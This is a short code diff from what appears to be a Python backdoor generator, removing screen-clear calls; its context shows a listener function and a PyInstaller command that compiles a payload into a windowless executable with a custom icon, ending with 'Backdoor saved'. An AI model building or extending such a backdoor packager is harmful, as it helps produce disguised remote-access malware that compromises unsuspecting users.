@@ -37,8 +37,6 @@ logo = """
 
 """
 
-clear = lambda: os.system('clear')
-clear()
 print(logo)
 def listen(host, port):
 
@@ -253,7 +251,6 @@ def postgen():
         else:
             compcomd = 'pyinstaller --noconfirm --onefile --windowed --hidden-import imp --hidden-import socket --hidden-import urllib3 --icon icon.ico '+name+'.py'
             os.system(compcomd)
-            os.system(clear)
             print(logo)
             print('Backdoor saved under "dist" folder')
 
